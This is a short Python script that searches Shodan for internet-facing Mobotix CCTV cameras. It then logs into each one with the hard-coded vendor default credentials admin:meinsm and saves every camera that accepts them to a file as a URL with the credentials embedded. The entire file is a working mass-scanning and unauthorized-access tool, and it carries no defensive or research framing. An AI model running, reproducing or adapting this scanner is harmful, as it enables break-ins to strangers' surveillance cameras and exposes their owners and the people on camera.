#!/usr/bin/env python
#
# mobotix.py
# Search SHODAN for Mobotix CCTV with default creds
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "your API KEY"
SEARCH_FOR = 'http.component:"mobotix"'
FILE = "/control/userimage.html"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		URL = "http://"+IP+":"+PORT+""+FILE+""
		URL2 = "http://admin:meinsm@"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0"}
		cookies = {"client_preview_mode":"off","quickcontrolparam":"display_mode"}
		response = session.get(URL, headers=headers,cookies=cookies, timeout=15, verify=False,auth=HTTPBasicAuth("admin","meinsm"))
		result = response.text
		if 'Enable JavaScript / Active Scripting to see more details' in result:
			text_file = open("./cfg/mobotix.cfg", "a")
			text_file.write(""+URL2+"\n")
			text_file.close()
			print ("[*] Defaults... Found  [*]\n")
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
